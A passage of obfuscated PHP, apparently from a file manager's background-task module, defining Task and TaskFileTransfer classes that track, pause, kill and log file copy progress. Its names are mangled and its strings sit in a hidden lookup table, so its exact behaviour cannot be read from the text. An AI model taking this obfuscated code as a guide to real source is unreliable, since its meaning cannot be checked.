floatval($‚£¦Éã[$¤ˆÇ§®¹[1656]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $×ØÓşö¤ =& $_SERVER[óó‹¸‚å]; static $°¼Úô†“ = 0; $ä£èÏÜ‡ = 300; if (!$°¼Úô†“) { $°¼Úô†“ = time(); } if (time() - $°¼Úô†“ < $ä£èÏÜ‡) { return; } $°¼Úô†“ = time(); $É˜äµ¿† = Model($×ØÓşö¤[513])->db($×ØÓşö¤[12]); if ($É˜äµ¿†) { $É˜äµ¿†->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($×ØÓşö¤[1657], $×ØÓşö¤[1658]); die; } } public static function taskRun($åºß¸¢ç) { $¥øÃ€ƒš =& $_SERVER[óó‹¸‚å]; self::log($¥øÃ€ƒš[1659] . $åºß¸¢ç[$¥øÃ€ƒš[399]] . $¥øÃ€ƒš[1660] . $åºß¸¢ç[$¥øÃ€ƒš[32]] . $¥øÃ€ƒš[1661] . $åºß¸¢ç[$¥øÃ€ƒš[1662]]); Model($¥øÃ€ƒš[1643])->run($åºß¸¢ç[$¥øÃ€ƒš[399]]); $›§»˜‘¡ = timeFloat(); $ß³û¥ğ = $¥øÃ€ƒš[12]; switch ($åºß¸¢ç[$¥øÃ€ƒš[33]]) { case $¥øÃ€ƒš[307]: $öÊÃ™Š = url_request($åºß¸¢ç[$¥øÃ€ƒš[1662]], $¥øÃ€ƒš[230], !1, !1, !1, !1, 10); if ($öÊÃ™Š[$¥øÃ€ƒš[754]]) { $ß³û¥ğ = strlen($öÊÃ™Š[$¥øÃ€ƒš[1210]]); } break; case $¥øÃ€ƒš[229]: $ß³û¥ğ = Hook::apply($åºß¸¢ç[$¥øÃ€ƒš[1662]]); default: break; } Model($¥øÃ€ƒš[1663])->add(array($¥øÃ€ƒš[1664] => $¥øÃ€ƒš[12], $¥øÃ€ƒš[1665] => $¥øÃ€ƒš[197], $¥øÃ€ƒš[33] => $¥øÃ€ƒš[1666] . $åºß¸¢ç[$¥øÃ€ƒš[399]], $¥øÃ€ƒš[1667] => json_encode(array($¥øÃ€ƒš[32] => $åºß¸¢ç[$¥øÃ€ƒš[32]], $¥øÃ€ƒš[1668] => timeFloat() - $›§»˜‘¡, $¥øÃ€ƒš[293] => $ß³û¥ğ)))); $ûç½Ù› = $ß³û¥ğ ? $¥øÃ€ƒš[1669] . $ß³û¥ğ : $¥øÃ€ƒš[12]; self::log($¥øÃ€ƒš[1670] . $åºß¸¢ç[$¥øÃ€ƒš[399]] . $¥øÃ€ƒš[164] . $ûç½Ù›); return !0; } private static function valueGet($µ‘‡ë³³) { $²Ïİ…® =& $_SERVER[óó‹¸‚å]; $İã¨­æÍ = $²Ïİ…®[1671]; $„ŒËÄşŞ = Model($²Ïİ…®[435])->get($µ‘‡ë³³, $İã¨­æÍ); if (is_null($„ŒËÄşŞ)) { Model($²Ïİ…®[435])->set($²Ïİ…®[754], $²Ïİ…®[88], $İã¨­æÍ); Model($²Ïİ…®[435])->set($²Ïİ…®[1633], $²Ïİ…®[197], $İã¨­æÍ); $„ŒËÄşŞ = Model($²Ïİ…®[435])->get($µ‘‡ë³³, $İã¨­æÍ); } return $„ŒËÄşŞ; } private static function valueSet($Å ·ãí, $Ï–Úµ†À) { $•òÆ¥é‹ =& $_SERVER[óó‹¸‚å]; $…¸ÚŸ¥œ = $•òÆ¥é‹[1672]; CacheLock::lock($…¸ÚŸ¥œ); $äÂÏÒËå = Model($•òÆ¥é‹[435])->set($Å ·ãí, $Ï–Úµ†À, $•òÆ¥é‹[1671]); CacheLock::unlock($…¸ÚŸ¥œ); return $äÂÏÒËå; } protected static function log($Œæ½ØŸò) { write_log($Œæ½ØŸò, $_SERVER[óó‹¸‚å][1658]); } private static function cacheClear() { $Ù­ïÁáĞ =& $_SERVER[óó‹¸‚å]; Cache::clearMemory(Model($Ù­ïÁáĞ[435])->cacheKey($Ù­ïÁáĞ[1671])); Cache::clearMemory(Model($Ù­ïÁáĞ[435])->cacheKey($Ù­ïÁáĞ[1673])); Model($Ù­ïÁáĞ[1643])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ûÛŞÜ§ô, $„äö’–Ó = '', $€”¤úö = 0, $¤°¶Õı× = '') { $ªå£…ÉÈ =& $_SERVER[óó‹¸‚å]; if (self::get($ûÛŞÜ§ô)) { return; } $â¸  = defined($ªå£…ÉÈ[475]) ? USER_ID : $ªå£…ÉÈ[197]; $this->task = array($ªå£…ÉÈ[399] => $ûÛŞÜ§ô, $ªå£…ÉÈ[1674] => $â¸ , $ªå£…ÉÈ[1574] => $¤°¶Õı×, $ªå£…ÉÈ[453] => $ªå£…ÉÈ[12], $ªå£…ÉÈ[33] => $„äö’–Ó, $ªå£…ÉÈ[1071] => $ªå£…ÉÈ[12], $ªå£…ÉÈ[790] => $€”¤úö, $ªå£…ÉÈ[1675] => 0, $ªå£…ÉÈ[1676] => 0, $ªå£…ÉÈ[1677] => 0, $ªå£…ÉÈ[1678] => timeFloat(), $ªå£…ÉÈ[1679] => 0, $ªå£…ÉÈ[1680] => 0, $ªå£…ÉÈ[1681] => 0, $ªå£…ÉÈ[1682] => 0, $ªå£…ÉÈ[754] => $ªå£…ÉÈ[1633]); $GLOBALS[$ªå£…ÉÈ[1683]] = 1; Hook::bind($ªå£…ÉÈ[1638], array($this, $ªå£…ÉÈ[1684])); Hook::bind($ªå£…ÉÈ[1685], array($this, $ªå£…ÉÈ[1686])); $this->startAfter(); Hook::trigger($ªå£…ÉÈ[1687], $this->task); $this->task[$ªå£…ÉÈ[1680]] = timeFloat(); } public function end($ Ëòüğ” = '') { $™ù§²¦Ş =& $_SERVER[óó‹¸‚å]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$™ù§²¦Ş[1680]]) { self::valueSet($this->task[$™ù§²¦Ş[399]], !1); } $this->isEnd = !0; if ($ Ëòüğ”) { $this->task[$™ù§²¦Ş[453]] = $ Ëòüğ”; } self::log($™ù§²¦Ş[1688] . $this->task[$™ù§²¦Ş[399]] . $™ù§²¦Ş[1689] . sprintf($™ù§²¦Ş[854], timeFloat() - $this->task[$™ù§²¦Ş[1678]]) . $™ù§²¦Ş[1690]); Hook::unbind($™ù§²¦Ş[1638], array($this, $™ù§²¦Ş[1684])); Hook::unbind($™ù§²¦Ş[1685], array($this, $™ù§²¦Ş[1686])); $this->endAfter(); $îí›¼¼‡ = $this->task; $this->task = !1; Hook::trigger($™ù§²¦Ş[1691], $îí›¼¼‡); } public function update($® ¬¥± = 0, $€ÛĞƒû† = false) { $Û÷‚¯²Ô =& $_SERVER[óó‹¸‚å]; $¡­„”‡š =& $this->task; if (!$¡­„”‡š) { return; } $¡­„”‡š[$Û÷‚¯²Ô[1675]] += $® ¬¥±; $¡­„”‡š[$Û÷‚¯²Ô[1679]] = timeFloat(); if ($¡­„”‡š[$Û÷‚¯²Ô[790]]) { if ($¡­„”‡š[$Û÷‚¯²Ô[790]] < $¡­„”‡š[$Û÷‚¯²Ô[1675]]) { $¡­„”‡š[$Û÷‚¯²Ô[790]] = $¡­„”‡š[$Û÷‚¯²Ô[1675]]; } $„áùı‚ = timeFloat() - $¡­„”‡š[$Û÷‚¯²Ô[1678]] - $¡­„”‡š[$Û÷‚¯²Ô[1681]]; if ($„áùı‚ <= 0) { $„áùı‚ = 0.001; } $¡­„”‡š[$Û÷‚¯²Ô[1676]] = $¡­„”‡š[$Û÷‚¯²Ô[1675]] / $¡­„”‡š[$Û÷‚¯²Ô[790]]; $¡­„”‡š[$Û÷‚¯²Ô[1677]] = $¡­„”‡š[$Û÷‚¯²Ô[1675]] / $„áùı‚; if ($¡­„”‡š[$Û÷‚¯²Ô[1676]] > 0) { $¡­„”‡š[$Û÷‚¯²Ô[1682]] = $„áùı‚ * (1 - $¡­„”‡š[$Û÷‚¯²Ô[1676]]) / $¡­„”‡š[$Û÷‚¯²Ô[1676]]; } $¡­„”‡š[$Û÷‚¯²Ô[1682]] = $¡­„”‡š[$Û÷‚¯²Ô[1682]] <= 0 ? 0 : $¡­„”‡š[$Û÷‚¯²Ô[1682]]; } $this->updateAfter(); $Úş›Ìİ“ = 0.2; if (timeFloat() - $¡­„”‡š[$Û÷‚¯²Ô[1680]] < $Úş›Ìİ“ && !$€ÛĞƒû†) { return; } $ƒ¹¡Ø×» = self::get($¡­„”‡š[$Û÷‚¯²Ô[399]]); $ÊËÂ³¨¦ = $ƒ¹¡Ø×»[$Û÷‚¯²Ô[754]]; if ($ÊËÂ³¨¦ == self::STATYS_KILL) { $€ôŒÔæ– = array($Û÷‚¯²Ô[1692] => LNG($Û÷‚¯²Ô[1693]), $Û÷‚¯²Ô[1220] => !1); Cache::set($Û÷‚¯²Ô[1694] . $this->task[$Û÷‚¯²Ô[399]], $€ôŒÔæ–, 30); $this->onKill(); $this->end(); die; } else { if ($ÊËÂ³¨¦ == self::STATYS_STOP) { $ÌúË“©• = 2; $ƒ¹¡Ø×»[$Û÷‚¯²Ô[1681]] += $ÌúË“©•; self::valueSet($¡­„”‡š[$Û÷‚¯²Ô[399]], $ƒ¹¡Ø×»); sleep($ÌúË“©•); $this->update(); return; } } $¡­„”‡š[$Û÷‚¯²Ô[754]] = $ÊËÂ³¨¦ ? $ÊËÂ³¨¦ : $¡­„”‡š[$Û÷‚¯²Ô[754]]; $¡­„”‡š[$Û÷‚¯²Ô[1681]] = $ƒ¹¡Ø×»[$Û÷‚¯²Ô[1681]] ? $ƒ¹¡Ø×»[$Û÷‚¯²Ô[1681]] : 0; $¡­„”‡š[$Û÷‚¯²Ô[1680]] = timeFloat(); Hook::trigger($Û÷‚¯²Ô[1695], $¡­„”‡š); self::valueSet($¡­„”‡š[$Û÷‚¯²Ô[399]], $¡­„”‡š); } public function onKillSet($ÛÚˆºıú, $¬Œâ‘ô = array()) { $this->onKillCall = array($ÛÚˆºıú, $¬Œâ‘ô); } public function onKill() { $º€—à¶Ò =& $_SERVER[óó‹¸‚å]; self::log($º€—à¶Ò[1688] . $this->task[$º€—à¶Ò[399]] . $º€—à¶Ò[1696]); Hook::trigger($º€—à¶Ò[1697], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($×…¶³½˜) { $İ¶ÃáÔ =& $_SERVER[óó‹¸‚å]; Cache::set($İ¶ÃáÔ[1694] . $this->task[$İ¶ÃáÔ[399]], $×…¶³½˜, 60); return $×…¶³½˜; } public static function get($»×ªÄ©) { $ÍËïØ€¢ =& $_SERVER[óó‹¸‚å]; $ô¶”¯·Ù = self::valueGet($»×ªÄ©); if (is_array($ô¶”¯·Ù) && $ô¶”¯·Ù[$ÍËïØ€¢[1698]]) { $İ˜ğ‘Ï¸ = ActionApply($ô¶”¯·Ù[$ÍËïØ€¢[1698]], array($ô¶”¯·Ù)); $ô¶”¯·Ù = is_array($İ˜ğ‘Ï¸) ? $İ˜ğ‘Ï¸ : $ô¶”¯·Ù; } return $ô¶”¯·Ù; } public static function listData() { $©ŒÍìû‹ = self::valueGet(); return array_sort_by($©ŒÍìû‹, $_SERVER[óó‹¸‚å][1678], !0); } public static function kill($îª†Æöç) { return self::changeStatus($îª†Æöç, self::STATYS_KILL); } public static function stop($›ÅóĞ´¤) { return self::changeStatus($›ÅóĞ´¤, self::STATYS_STOP); } public static function restart($®˜¾å…€) { return self::changeStatus($®˜¾å…€, self::STATYS_RUNNING); } public static function killAll() { $èÎ¨®Û =& $_SERVER[óó‹¸‚å]; $Óü™©Ö = self::listData(); foreach ($Óü™©Ö as $¹œ±ŒŸÚ) { self::kill($¹œ±ŒŸÚ[$èÎ¨®Û[399]]); } sleep(2); foreach ($Óü™©Ö as $¹œ±ŒŸÚ) { self::valueSet($¹œ±ŒŸÚ[$èÎ¨®Û[399]], !1); } } private static function changeStatus($Ù’ÒÈÊş, $¿÷Ïáì­) { $ÏßğÒ…‚ =& $_SERVER[óó‹¸‚å]; $¼¼À‰’Ø = self::valueGet($Ù’ÒÈÊş); if (!$¼¼À‰’Ø) { return !1; } $¼¼À‰’Ø[$ÏßğÒ…‚[754]] = $¿÷Ïáì­; self::valueSet($Ù’ÒÈÊş, $¼¼À‰’Ø); self::log($ÏßğÒ…‚[1699] . $¼¼À‰’Ø[$ÏßğÒ…‚[399]] . $ÏßğÒ…‚[1700] . $¿÷Ïáì­); return !0; } public static function valueGet($Áô»Íº¢ = false) { $¨–Æ€¨à =& $_SERVER[óó‹¸‚å]; $·¹İ–‚ = defined($¨–Æ€¨à[475]) ? USER_ID : $¨–Æ€¨à[197]; if ($Áô»Íº¢) { $îèøİ  = Model($¨–Æ€¨à[447])->where(array($¨–Æ€¨à[94] => $Áô»Íº¢, $¨–Æ€¨à[33] => $¨–Æ€¨à[1078]))->find(); return $îèøİ  ? json_decode($îèøİ [$¨–Æ€¨à[374]], !0) : !1; } return self::taskListUser($·¹İ–‚); } public static function taskListUser($ÊĞ—Ë³ = false) { $Ûôâà =& $_SERVER[óó‹¸‚å]; $ûÔï´´× = array($Ûôâà[33] => $Ûôâà[1078]); if ($ÊĞ—Ë³) { $ûÔï´´×[$Ûôâà[1674]] = $ÊĞ—Ë³; } $¡Ù†ºÌÒ = Model($Ûôâà[447])->where($ûÔï´´×)->select(); $¡Ù†ºÌÒ = $¡Ù†ºÌÒ ? $¡Ù†ºÌÒ : array(); foreach ($¡Ù†ºÌÒ as $˜­´»ã± => $©‚ó°€€) { $¡Ù†ºÌÒ[$˜­´»ã±] = json_decode($©‚ó°€€[$Ûôâà[374]], !0); } return $¡Ù†ºÌÒ; } public static function valueSet($ş¢¦¼òÎ, $•ğïûº¯) { $šÊêáİÈ =& $_SERVER[óó‹¸‚å]; if (!$•ğïûº¯) { return Model($šÊêáİÈ[447])->where(array($šÊêáİÈ[94] => $ş¢¦¼òÎ, $šÊêáİÈ[33] => $šÊêáİÈ[1078]))->delete(); } $ò«‚»Öá = json_encode($•ğïûº¯); if (!$ò«‚»Öá) { ob_start(); var_dump($•ğïûº¯); $ŒÀê²„ = ob_get_clean(); self::log($šÊêáİÈ[1701] . json_encode_force($ŒÀê²„)); } if (!$ş¢¦¼òÎ || !$•ğïûº¯[$šÊêáİÈ[399]]) { return !1; } $ªÊÆªÖŠ = defined($šÊêáİÈ[475]) ? USER_ID : $šÊêáİÈ[197]; $ÇâóÇ´ = array($šÊêáİÈ[33] => $šÊêáİÈ[1078], $šÊêáİÈ[1674] => $ªÊÆªÖŠ, $šÊêáİÈ[94] => $ş¢¦¼òÎ, $šÊêáİÈ[374] => $ò«‚»Öá); $à·´Ö = $šÊêáİÈ[1702]; CacheLock::lock($à·´Ö); Model($šÊêáİÈ[447])->add($ÇâóÇ´, array(), !0); CacheLock::unlock($à·´Ö); } public static function log($¶é®Ö˜Í) { if (!GLOBAL_DEBUG) { return; } write_log($¶é®Ö˜Í, $_SERVER[óó‹¸‚å][1703]); } } class TaskFileTransfer extends Task { protected function startAfter() { $€×å·÷Î =& $_SERVER[óó‹¸‚å]; $¥¯¬…Û¬ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($€×å·÷Î[1704], array($this, $€×å·÷Î[1705])); Hook::bind($€×å·÷Î[1231], array($this, $€×å·÷Î[1706])); Hook::bind($€×å·÷Î[1707], array($this, $€×å·÷Î[1708])); Hook::bind($€×å·÷Î[604], array($this, $€×å·÷Î[1709])); Hook::bind($€×å·÷Î[605], array($this, $€×å·÷Î[1710])); Hook::bind($€×å·÷Î[610], array($this, $€×å·÷Î[1711])); Hook::bind($€×å·÷Î[611], array($this, $€×å·÷Î[1712])); Hook::bind($€×å·÷Î[607], array($this, $€×å·÷Î[1713])); Hook::bind($€×å·÷Î[608], array($this, $€×å·÷Î[1714])); Hook::bind($€×å·÷Î[574], array($this, $€×å·÷Î[1715])); Hook::bind($€×å·÷Î[571], array($this, $€×å·÷Î[1715])); Hook::bind($€×å·÷Î[576], array($this, $€×å·÷Î[1715])); Hook::bind($€×å·÷Î[578], array($this, $€×å·÷Î[1715])); Hook::bind($€×å·÷Î[580], array($this, $€×å·÷Î[1715])); Hook::bind($€×å·÷Î[1716], array($this, $€×å·÷Î[1717])); Hook::bind($€×å·÷Î[597], array($this, $€×å·÷Î[1718])); $this->sourceModelCopyFlag = !1; Hook::bind($€×å·÷Î[1719], array($this, $€×å·÷Î[1720])); Hook::bind($€×å·÷Î[1721], array($this, $€×å·÷Î[1722])); Hook::bind($€×å·÷Î[1723], array($this, $€×å·÷Î[1724])); $¥¯¬…Û¬[$€×å·÷Î[1725]] = LNG($€×å·÷Î[1726]); $¥¯¬…Û¬[$€×å·÷Î[1727]] = 0; $¥¯¬…Û¬[$€×å·÷Î[1728]] = 0; $¥¯¬…Û¬[$€×å·÷Î[1071]] = $€×å·÷Î[12]; $¥¯¬…Û¬[$€×å·÷Î[1729]] = $€×å·÷Î[12]; $¥¯¬…Û¬[$€×å·÷Î[1730]] = 0; $¥¯¬…Û¬[$€×å·÷Î[1731]] = 0; $¥¯¬…Û¬[$€×å·÷Î[1732]] = 0; if (!$¥¯¬…Û¬[$€×å·÷Î[1574]]) { $¥¯¬…Û¬[$€×å·÷Î[1574]] = LNG($€×å·÷Î[1733]); } } protected function endAfter() { $¹íñ«ûÈ =& $_SERVER[óó‹¸‚å]; Hook::unbind($¹íñ«ûÈ[1704], array($this, $¹íñ«ûÈ[1705])); Hook::unbind($¹íñ«ûÈ[1231], array($this, $¹íñ«ûÈ[1706])); Hook::unbind($¹íñ«ûÈ[1707], array($this, $¹íñ«ûÈ[1708])); Hook::unbind($¹íñ«ûÈ[604], array($this, $¹íñ«ûÈ[1709])); Hook::unbind($¹íñ«ûÈ[605], array($this, $¹íñ«ûÈ[1710])); Hook::unbind($¹íñ«ûÈ[610], array($this, $¹íñ«ûÈ[1711])); Hook::unbind($¹íñ«ûÈ[611], array($this, $¹íñ«ûÈ[1712])); Hook::unbind($¹íñ«ûÈ[607], array($this, $¹íñ«ûÈ[1713])); Hook::unbind($¹íñ«ûÈ[608], array($this, $¹íñ«ûÈ[1714])); Hook::unbind($¹íñ«ûÈ[574], array($this, $¹íñ«ûÈ[1715])); Hook::unbind($¹íñ«ûÈ[571], array($this, $¹íñ«ûÈ[1715])); Hook::unbind($¹íñ«ûÈ[576], array($this, $¹íñ«ûÈ[1715])); Hook::unbind($¹íñ«ûÈ[578], array($this, $¹íñ«ûÈ[1715])); Hook::unbind($¹íñ«ûÈ[580], array($this, $¹íñ«ûÈ[1715])); Hook::unbind($¹íñ«ûÈ[1716], array($this, $¹íñ«ûÈ[1717])); Hook::unbind($¹íñ«ûÈ[597], array($this, $¹íñ«ûÈ[1718])); Hook::unbind($¹íñ«ûÈ[1719], array($this, $¹íñ«ûÈ[1720])); Hook::unbind($¹íñ«ûÈ[1721], array($this, $¹íñ«ûÈ[1722])); Hook::unbind($¹íñ«ûÈ[1723], array($this, $¹íñ«ûÈ[1724])); } public function copyMoveStart($«…Å‘ÚÙ, $“ûØŸğş, $õ““ì¢, $àŸ÷êÕ«) { $§Ø¥‡ñà =& $_SERVER[óó‹¸‚å]; self::log($§Ø¥‡ñà[1734] . $“ûØŸğş . $§Ø¥‡ñà[70] . $àŸ÷êÕ«); $§‡Äš·¸ = rtrim(TEMP_FILES, $§Ø¥‡ñà[8]); if (substr($“ûØŸğş, 0, strlen($§‡Äš·¸)) == $§‡Äš·¸) { return; } if (substr($àŸ÷êÕ«, 0, strlen($§‡Äš·¸)) == $§‡Äš·¸) { return; } $Ó ×“Ëô =& $this->task; $Ó ×“Ëô[$§Ø¥‡ñà[1735]] = KodIO::transferType($«…Å‘ÚÙ, $õ““ì¢); $this->update(); } public function updateAfter() { $ö©×ıç =& $_SERVER[óó‹¸‚å]; $Œ€¤²«š =& $this->task; if (!$Œ€¤²«š[$ö©×ıç[767]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Œ€¤²«š[$ö©×ıç[1735]] == $ö©×ıç[1320]) { return; } self::updateTask($Œ€¤²«š); } private static function updateTask(&$—Æ¯Íêğ) { $–øº¹‚Ì =& $_SERVER[óó‹¸‚å]; if ($—Æ¯Íêğ[$–øº¹‚Ì[1735]] == $–øº¹‚Ì[1202] || $—Æ¯Íêğ[$–øº¹‚Ì[1735]] == $–øº¹‚Ì[107]) { if ($—Æ¯Íêğ[$–øº¹‚Ì[1729]]) { $—Æ¯Íêğ[$–øº¹‚Ì[1732]] = $—Æ¯Íêğ[$–øº¹‚Ì[1731]] + $—Æ¯Íêğ[$–øº¹‚Ì[1728]]; } } else { if ($—Æ¯Íêğ[$–øº¹‚Ì[1735]] == $–øº¹‚Ì[1321]) { if ($—Æ¯Íêğ[$–øº¹‚Ì[1729]] == $–øº¹‚Ì[1202]) { $—Æ¯Íêğ[$–øº¹‚Ì[1732]] = $—Æ¯Íêğ[$–øº¹‚Ì[1731]] + $—Æ¯Íêğ[$–øº¹‚Ì[1728]] * 0.5; } else { if ($—Æ¯Íêğ[$–øº¹‚Ì[1729]] == $–øº¹‚Ì[107]) { $—Æ¯Íêğ[$–øº¹‚Ì[1732]] = $—Æ¯Íêğ[$–øº¹‚Ì[1731]] + $—Æ¯Íêğ[$–øº¹‚Ì[1727]] * 0.5 + $—Æ¯Íêğ[$–øº¹‚Ì[1728]] * 0.5; } } } } $—Æ¯Íêğ[$–øº¹‚Ì[1676]] = $—Æ¯Íêğ[$–øº¹‚Ì[1732]] / $—Æ¯Íêğ[$–øº¹‚Ì[767]]; if ($—Æ¯Íêğ[$–øº¹‚Ì[1676]] > 0) { $‹¹«ıÚä = timeFloat() - $—Æ¯Íêğ[$–øº¹‚Ì[1678]] - $—Æ¯Íêğ[$–øº¹‚Ì[1681]]; $—Æ¯Íêğ[$–øº¹‚Ì[1682]] = $‹¹«ıÚä * (1 - $—Æ¯Íêğ[$–øº¹‚Ì[1676]]) / $—Æ¯Íêğ[$–øº¹‚Ì[1676]]; } } public function addPath($°½ÀÓÌ) { $ö¯şÃ™Ñ =& $_SERVER[óó‹¸‚å]; if (!$°½ÀÓÌ) { return; } $îŒ‰¹– =& $this->task; $ğùÒ¤ = IO::infoWithChildren($°½ÀÓÌ); $Ç·ÏÕê = $îŒ‰¹–[$ö¯şÃ™Ñ[1736]] ? $îŒ‰¹–[$ö¯şÃ™Ñ[1736]][$ö¯şÃ™Ñ[1737]] : 0; $îŒ‰¹–[$ö¯şÃ™Ñ[1736]] = array($ö¯şÃ™Ñ[1737] => $Ç·ÏÕê + 1, $ö¯şÃ™Ñ[420] => $ğùÒ¤[$ö¯şÃ™Ñ[32]], $ö¯şÃ™Ñ[84] => $ğùÒ¤[$ö¯şÃ™Ñ[84]], $ö¯şÃ™Ñ[519] => $ğùÒ¤[$ö¯şÃ™Ñ[519]] ? $ğùÒ¤[$ö¯şÃ™Ñ[519]] : $ğùÒ¤[$ö¯şÃ™Ñ[84]]); if ($ğùÒ¤[$ö¯şÃ™Ñ[33]] == $ö¯şÃ™Ñ[199]) { $îŒ‰¹–[$ö¯şÃ™Ñ[790]] += 1; } else { $îŒ‰¹–[$ö¯şÃ™Ñ[790]] += $ğùÒ¤[$ö¯şÃ™Ñ[79]][$ö¯şÃ™Ñ[77]]; if ($ğùÒ¤[$ö¯şÃ™Ñ[402]]) { $îŒ‰¹–[$ö¯şÃ™Ñ[790]] += $ğùÒ¤[$ö¯şÃ™Ñ[79]][$ö¯şÃ™Ñ[78]] + 1; } } $îŒ‰¹–[$ö¯şÃ™Ñ[767]] += $ğùÒ¤[$ö¯şÃ™Ñ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÕòßÇÑ´) { } public function sourceAddHashEnd($ÄÛñŞŸÙ) { } public function sourceAddFileStart($âáíº³î) { $™Â²àæƒ =& $_SERVER[óó‹¸‚å]; $¸èÀı¦â =& $this->task; $¸èÀı¦â[$™Â²àæƒ[1727]] = $âáíº³î[$™Â²àæƒ[76]]; $¸èÀı¦â[$™Â²àæƒ[1725]] = $âáíº³î[$™Â²àæƒ[32]]; $¸èÀı¦â[$™Â²àæƒ[1071]] = $âáíº³î[$™Â²àæƒ[32]]; $¸èÀı¦â[$™Â²àæƒ[1738]] = $âáíº³î[$™Â²àæƒ[84]]; $this->update(); } public function sourceAddFileEnd($Ó¶àï) { $õşŒ‰Â =& $_SERVER[óó‹¸‚å]; $È£º¶‡œ =& $this->task; $È£º¶‡œ[$õşŒ‰Â[1732]] += $Ó¶àï[$õşŒ‰Â[76]]; $È£º¶‡œ[$õşŒ‰Â[1738]] = $Ó¶àï[$õşŒ‰Â[84]]; $this->update(1); } public function copyFileStart($–ïƒ–”Ü, $®€íÓéä, $ËÁ¾§È›, $şö×±¡, $›şÓÃİ, $ó­ø‰Ø®) { $Ô¤ÂÌë† =& $_SERVER[óó‹¸‚å]; $î’ŒÇ‚ = $›şÓÃİ; if ($î’ŒÇ‚ == $GLOBALS[$Ô¤ÂÌë†[1739]]) { $î’ŒÇ‚ = $GLOBALS[$Ô¤ÂÌë†[1740]]; } $GLOBALS[$Ô¤ÂÌë†[1740]] = $›şÓÃİ; $GLOBALS[$Ô¤ÂÌë†[1739]] = $ó­ø‰Ø®; $“½°õ—¹ =& $this->task; $“½°õ—¹[$Ô¤ÂÌë†[1725]] = $î’ŒÇ‚; $“½°õ—¹[$Ô¤ÂÌë†[1727]] = (int) $–ïƒ–”Ü->size($®€íÓéä); $“½°õ—¹[$Ô¤ÂÌë†[1728]] = 0; $“½°õ—¹[$Ô¤ÂÌë†[1071]] = $Ô¤ÂÌë†[12]; $“½°õ—¹[$Ô¤ÂÌë†[1729]] = $Ô¤ÂÌë†[12]; $“½°õ—¹[$Ô¤ÂÌë†[1730]] = 0; $‰Îñ°Â¡ = $“½°õ—¹[$Ô¤ÂÌë†[1727]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($“½°õ—¹[$Ô¤ÂÌë†[399]] . $Ô¤ÂÌë†[1741]); if ($‰Îñ°Â¡ && file_exists(get_path_father($şö×±¡))) { Cache::set($“½°õ—¹[$Ô¤ÂÌë†[399]] . $Ô¤ÂÌë†[1741], $şö×±¡); $“½°õ—¹[$Ô¤ÂÌë†[1698]] = array($Ô¤ÂÌë†[1742], $Ô¤ÂÌë†[1743]); } $this->update(0, $‰Îñ°Â¡); } public static function updateCopyLocalFileSize($îÈÍÔµ) { $üÀèˆ¥÷ =& $_SERVER[óó‹¸‚å]; $§„Äå™è = Cache::get($îÈÍÔµ[$üÀèˆ¥÷[399]] . $üÀèˆ¥÷[1741]); if (!$§„Äå™è || !file_exists($§„Äå™è)) { return $îÈÍÔµ; } $îÈÍÔµ[$üÀèˆ¥÷[1728]] = @filesize($§„Äå™è); $îÈÍÔµ[$üÀèˆ¥÷[1732]] += $îÈÍÔµ[$üÀèˆ¥÷[1728]]; self::updateTask($îÈÍÔµ); return $îÈÍÔµ; } public function copyFileEnd($ØçÆ±å, $ÄŠ«æÉ, $Œ¦’Ö”, $»ÂµÑÖĞ, $¬é­Ô¤, $Šñç¢´ä) { $ì§Ô¬ªş =& $_SERVER[óó‹¸‚å]; $×ŸÁùµš =& $this->task; $×ŸÁùµš[$ì§Ô¬ªş[1728]] = $×ŸÁùµš[$ì§Ô¬ªş[1727]]; $×ŸÁùµš[$ì§Ô¬ªş[1729]] = $ì§Ô¬ªş[12]; unset($×ŸÁùµš[$ì§Ô¬ªş[1698]]); if ($¬é­Ô¤ == $×ŸÁùµš[$ì§Ô¬ªş[1725]]) { $×ŸÁùµš[$ì§Ô¬ªş[1731]] += $×ŸÁùµš[$ì§Ô¬ªş[1727]]; $×ŸÁùµš[$ì§Ô¬ªş[1732]] = $×ŸÁùµš[$ì§Ô¬ªş[1731]]; $ˆÁÓäš™ = 1; if (isset($×ŸÁùµš[$ì§Ô¬ªş[1738]]) && $×ŸÁùµš[$ì§Ô¬ªş[1738]] == $ÄŠ«æÉ) { $ˆÁÓäš™ = 0; } $this->update($ˆÁÓäš™); } else { $this->update(); $×ŸÁùµš[$ì§Ô¬ªş[1728]] = 0; } Cache::remove($×ŸÁùµš[$ì§Ô¬ªş[399]] . $ì§Ô¬ªş[1741]); self::log($ì§Ô¬ªş[1744] . $ÄŠ«æÉ . $ì§Ô¬ªş[70] . $»ÂµÑÖĞ . $ì§Ô¬ªş[231] . $¬é­Ô¤ . $ì§Ô¬ªş[1745] . $×ŸÁùµš[$ì§Ô¬ªş[1725]]); } public function updateFileEnd($¢¬Úşèø, $Üšô¾¹ ) { $ŠşÀ‰ºŒ =& $_SERVER[óó‹¸‚å]; $Ä«ŸÀ„Š =& $this->task; $Ä«ŸÀ„Š[$ŠşÀ‰ºŒ[1725]] = $¢¬Úşèø; $Ä«ŸÀ„Š[$ŠşÀ‰ºŒ[1727]] = $Üšô¾¹ ; $Ä«ŸÀ„Š[$ŠşÀ‰ºŒ[1731]] += $Üšô¾¹ ; $Ä«ŸÀ„Š[$ŠşÀ‰ºŒ[1732]] = $Ä«ŸÀ„Š[$ŠşÀ‰ºŒ[1731]]; $this->update(1); self::log($ŠşÀ‰ºŒ[1746] . $¢¬Úşèø); } public function sourceModelCopy($üâÄ¹‚–) { $…Ø† ×” =& $_SERVER[óó‹¸‚å]; $©ê·íÑÎ = $üâÄ¹‚–[0]; $ûÎ„Ì¸Ğ = 